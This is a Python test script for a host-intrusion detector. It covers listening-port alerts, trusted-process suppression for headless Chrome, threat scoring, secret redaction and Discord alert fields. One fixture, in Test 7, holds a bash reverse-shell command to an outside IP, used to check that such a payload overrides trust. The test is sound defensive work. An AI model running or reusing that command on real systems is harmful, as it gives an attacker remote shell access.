import asyncio
import os
import sys
import time

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

from config.manager import HostPersistenceDetectorConfig, TceConfig, TrustedProcessProfile
from core.datatypes import EventCategory
from core.event_bus import EventBus
import modules.host_persistence_detector as hpd
from modules.host_persistence_detector import HostPersistenceDetector, list_listening_ports
from modules.threat_correlation_engine import (
    ClassifiedEvent, CorrelationCandidateEvent, classify_event, score_group,
)

_REAL_SLEEP = asyncio.sleep

_TRUSTED_PROFILE = [TrustedProcessProfile(
    name="puppeteer_playwright_headless_browser",
    executable_basenames=["chrome", "chromium", "headless_shell"],
    path_substrings=[".cache/puppeteer/"],
    parent_basenames=["node"],
    require_same_uid_as_parent=True,
    cmdline_substrings=[],
)]

_TRUST_MATCH_DETAIL = {
    "profile_name": "puppeteer_playwright_headless_browser", "basename_match": True,
    "path_match": True, "matched_path_substring": ".cache/puppeteer/",
    "parent_match": True, "uid_match": True,
}


def port_info(
    process_name="chrome", pid=1234, ppid=100, cmdline="chrome --headless --remote-debugging-port=0",
    fingerprint="fp-chrome-1", trusted=False, bind_address="127.0.0.1", uid=1000,
):
    return {
        "process_name": process_name, "pid": pid, "binary_path": "/home/u/.cache/puppeteer/chrome/chrome",
        "ppid": ppid, "parent_process_name": "node", "linux_user": "deploy", "uid": uid, "gid": uid,
        "cwd": "/home/u/app", "cmdline": cmdline, "pid_create_time": 1000.0,
        "bind_address": bind_address, "protocol": "TCP", "state": "LISTEN",
        "bind_classification": "LOOPBACK_ONLY" if bind_address == "127.0.0.1" else "ALL_INTERFACES",
        "exposure": "LOCAL_ONLY" if bind_address == "127.0.0.1" else "INTERNET_EXPOSED",
        "process_fingerprint": fingerprint, "parent_fingerprint": "fp-parent-1",
        "executable_sha256": "a" * 64,
        "trust_classification": "puppeteer_playwright_headless_browser" if trusted else None,
        "trust_match_detail": dict(_TRUST_MATCH_DETAIL) if trusted else None,
    }


def make_detector(**overrides):
    overrides.setdefault("port_confirmation_delay_seconds", 0.0)
    overrides.setdefault("trusted_process_profiles", _TRUSTED_PROFILE)
    cfg = HostPersistenceDetectorConfig(enabled=True, **overrides)
    mon = HostPersistenceDetector(EventBus(), cfg)
    published = []
    mon.publish = lambda ev: published.append(ev)
    return mon, published


def port_events(published):
    return [e for e in published if e.category == EventCategory.PERSISTENCE_NEW_PORT]


class FakeLoop:
    async def run_in_executor(self, _executor, fn, *args):
        return fn(*args)


async def main() -> None:
    loop = FakeLoop()

    import psutil
    from collections import namedtuple
    FakeAddr = namedtuple("FakeAddr", ["ip", "port"])
    FakeConn = namedtuple("FakeConn", ["status", "laddr", "raddr", "pid"])
    established_only = [FakeConn(psutil.CONN_ESTABLISHED, FakeAddr("10.0.0.5", 51000), FakeAddr("1.2.3.4", 443), 1234)]
    original_net_connections = psutil.net_connections
    psutil.net_connections = lambda kind="inet": established_only
    try:
        result = list_listening_ports(HostPersistenceDetectorConfig())
    finally:
        psutil.net_connections = original_net_connections
    assert result == {}, f"an ESTABLISHED outbound connection must never appear as a listener: {result}"
    print("Test 1/13 (ESTABLISHED outbound connection never becomes a PERSISTENCE_NEW_PORT candidate) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {19222: port_info(trusted=True, fingerprint="fp-chrome-1")}
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    events = port_events(pub)
    assert len(events) == 1, f"a suppressed trusted listener must still be published internally: {pub}"
    assert events[0].metadata["notify_discord"] is False
    assert events[0].metadata["classification"] == "TRUSTED_EXPECTED_PROCESS"
    assert events[0].metadata["suppressed_alert"] == "PERSISTENCE_NEW_PORT"
    assert events[0].metadata["suppression_reason"].startswith("trusted_process_profile:")
    print("Test 2 (trusted Chrome helper: suppressed from Discord, kept internally/auditable) PASSED")

    tce_config = TceConfig()
    candidate = CorrelationCandidateEvent(
        event_id="e1", timestamp=time.time(), category="PERSISTENCE_NEW_PORT", severity="INFO",
        message="suppressed", source_module="host_persistence_detector", project="p",
        raw_metadata={"classification": "TRUSTED_EXPECTED_PROCESS"},
    )
    classified = classify_event(candidate, tce_config)
    assert classified.kind == "Trusted listener (expected)", classified.kind
    assert classified.weight == 0, classified.weight
    print("Test 3 (trusted expected listener classifies as zero-weight Context, never Security Evidence) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {19223: port_info(trusted=False, fingerprint="fp-fake-chrome")}
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    events = port_events(pub)
    assert len(events) == 1
    assert events[0].metadata.get("notify_discord") is not False, "an untrusted listener must never be suppressed"
    assert events[0].metadata["classification"] == "UNVERIFIED"
    print("Test 4 (basename 'chrome' but path/parent/uid don't fully match: NOT trusted, full alert) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {19224: port_info(trusted=True, fingerprint="fp-original")}
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    assert port_events(pub)[0].metadata["notify_discord"] is False, "first (trusted, new) observation is suppressed"

    hpd.list_listening_ports = lambda *_: {19224: port_info(trusted=True, fingerprint="fp-DIFFERENT")}
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    events = port_events(pub)
    assert len(events) == 2, f"an ownership change must always produce a NEW alert: {events}"
    ownership_event = events[1]
    assert ownership_event.metadata.get("notify_discord") is not False, (
        "an ownership change must NEVER be suppressed, even if the new fingerprint also matches "
        "a trusted profile"
    )
    assert ownership_event.metadata["previous_process_fingerprint"] == "fp-original"
    assert "ownership change" in ownership_event.metadata["detection_reason"].lower()
    print("Test 5/12 (same port, different fingerprint: ownership change always alerts, never suppressed) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {19225: port_info(trusted=False, fingerprint="fp-badparent")}
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    assert port_events(pub)[0].metadata["classification"] == "UNVERIFIED"
    print("Test 6 (suspicious/unexpected parent process: NOT trusted, full alert) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {
        19226: port_info(trusted=True, fingerprint="fp-shellpayload", cmdline="chrome -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'"),
    }
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    events = port_events(pub)
    assert len(events) == 1
    assert events[0].metadata.get("notify_discord") is not False, "a shell-payload cmdline must break suppression"
    assert events[0].metadata["classification"] == "SUSPICIOUS_COMMAND_OVERRIDE"
    print("Test 7 (shell/payload in cmdline overrides trust match, forces full alert) PASSED")

    reverse_shell_candidate = CorrelationCandidateEvent(
        event_id="rs1", timestamp=100.0, category="PROCESS_ANOMALY", severity="HIGH",
        message="reverse shell", source_module="process_anomaly_detector", project="p",
        pid=9999, process_fingerprint="fp-rs", discord_eligible=True,
        rules=["SHELL_SPAWN_NETWORK_TOOL"],
        raw_metadata={"user": "deploy"},
    )
    trusted_listener_candidate = CorrelationCandidateEvent(
        event_id="tl1", timestamp=100.0, category="PERSISTENCE_NEW_PORT", severity="INFO",
        message="trusted", source_module="host_persistence_detector", project="p",
        raw_metadata={"classification": "TRUSTED_EXPECTED_PROCESS"},
    )
    classified_group = [
        classify_event(reverse_shell_candidate, tce_config),
        classify_event(trusted_listener_candidate, tce_config),
    ]
    result = score_group(classified_group, tce_config)
    assert result.total == tce_config.detector_weights["Reverse Shell"], (
        f"a suppressed trusted listener must contribute ZERO score, reverse shell must score fully: {result.total}"
    )
    print("Test 8 (Chrome reverse shell/RCE/FIM evidence still scores fully despite a co-occurring trusted listener) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {
        3000: port_info(process_name="node", trusted=False, fingerprint="fp-node", bind_address="0.0.0.0"),
    }
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    events = port_events(pub)
    assert len(events) == 1
    assert events[0].severity.value == "HIGH"
    assert events[0].metadata.get("notify_discord") is not False
    print("Test 9 (normal Node/Next.js listener: existing full-alert detection unchanged) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {
        8080: port_info(process_name="mystery", trusted=False, fingerprint="fp-unknown", bind_address="0.0.0.0"),
    }
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    events = port_events(pub)
    assert len(events) == 1
    assert events[0].metadata["exposure"] == "INTERNET_EXPOSED"
    print("Test 10 (unknown public listener: detected with exposure classification surfaced) PASSED")

    mon, pub = make_detector()
    mon._baseline = {"ports": {}}
    hpd.list_listening_ports = lambda *_: {4001: port_info(trusted=False, fingerprint="fp-stable")}
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
    assert len(port_events(pub)) == 1, f"a stable, unchanged listener must alert exactly once: {port_events(pub)}"
    print("Test 11 (repeated same listener across cycles: exactly one alert, no inflation) PASSED")

    from core.process_fingerprint import sanitize_cmdline
    assert "[REDACTED]" in sanitize_cmdline("node app.js --api-key=sk-supersecret123")
    assert "sk-supersecret123" not in sanitize_cmdline("node app.js --api-key=sk-supersecret123")
    print("Test 14 (command line sanitization: sanitize_cmdline redacts secrets before storage) PASSED")

    from config.manager import DiscordConfig
    from core.datatypes import BaseEvent, Severity
    from core.event_bus import EventBus as _EventBus
    from discord_integration.webhook import DiscordWebhookDispatcher
    dispatcher = DiscordWebhookDispatcher(_EventBus(), DiscordConfig())
    full_event = BaseEvent(
        source_module="host_persistence_detector", category=EventCategory.PERSISTENCE_NEW_PORT,
        severity=Severity.HIGH, message="test", raw="",
        metadata={
            "classification": "UNVERIFIED", "confidence": 80, "port": 4001,
            "bind_address": "0.0.0.0", "protocol": "TCP", "state": "LISTEN",
            "exposure": "INTERNET_EXPOSED", "bind_classification": "ALL_INTERFACES",
            "first_seen": time.time(), "last_seen": time.time(),
            "pid": 1234, "ppid": 100, "linux_user": "deploy", "uid": 1000, "gid": 1000,
            "binary_path": "/usr/bin/node", "cwd": "/home/u/app", "cmdline": "node app.js",
            "pid_create_time": time.time(), "parent_process_name": "pm2",
            "systemd_unit": None, "pm2_app_name": "api", "domain": "api.example.com",
            "process_fingerprint": "fp1", "parent_fingerprint": "fp0", "executable_sha256": "a" * 64,
            "detection_reason": "Listening port baru terdeteksi.",
            "recommendation": "Verifikasi port ini.",
        },
    )
    payload = dispatcher._build_payload(full_event)
    field_names = {f["name"] for f in payload["embeds"][0]["fields"]}
    for expected in (
        "Assessment", "Confidence", "Port", "Bind Address", "Protocol", "State", "Exposure",
        "First Seen", "Last Seen", "PID", "PPID", "User", "UID", "GID", "Executable",
        "Working Directory", "Command", "Process Start Time", "Parent Process", "PM2 Application",
        "Domain/Virtual Host", "Process Fingerprint", "Parent Fingerprint", "Executable SHA256",
        "Detection Reason", "Recommendation",
    ):
        assert expected in field_names, f"missing expected forensic field: {expected} (have: {field_names})"
    print("Test 15 (complete Discord forensic field set renders correctly) PASSED")

    sparse_event = BaseEvent(
        source_module="host_persistence_detector", category=EventCategory.PERSISTENCE_NEW_PORT,
        severity=Severity.HIGH, message="test", raw="", metadata={"port": 5000},
    )
    payload2 = dispatcher._build_payload(sparse_event)
    assert payload2["embeds"][0]["fields"]
    print("Test 16 (missing metadata does not crash -- UNKNOWN rendered for absent fields) PASSED")

    from discord_integration.webhook import DiscordWebhookDispatcher as _Dispatcher
    suppressed_dispatcher = _Dispatcher(_EventBus(), DiscordConfig())
    suppressed_event = BaseEvent(
        source_module="host_persistence_detector", category=EventCategory.PERSISTENCE_NEW_PORT,
        severity=Severity.INFO, message="suppressed", raw="",
        metadata={"notify_discord": False, "port": 4001, "classification": "TRUSTED_EXPECTED_PROCESS"},
    )
    await suppressed_dispatcher._on_event(suppressed_event)
    assert len(suppressed_dispatcher._pending_heap) == 0, "a notify_discord=False event must never reach the send/queue path"
    print("Test 17 (suppressed event never reaches Discord queue, but publish() itself is never skipped) PASSED")

    result18 = score_group([classify_event(trusted_listener_candidate, tce_config)], tce_config)
    assert result18.total == 0, f"a lone suppressed trusted listener must score 0: {result18.total}"
    print("Test 18 (suppressed trusted listener alone never crosses any score threshold) PASSED")

    print("\nALL PERSISTENCE_NEW_PORT FORENSIC OUTPUT + CHROME/PUPPETEER TRUST UPGRADE TESTS PASSED")


asyncio.run(main())
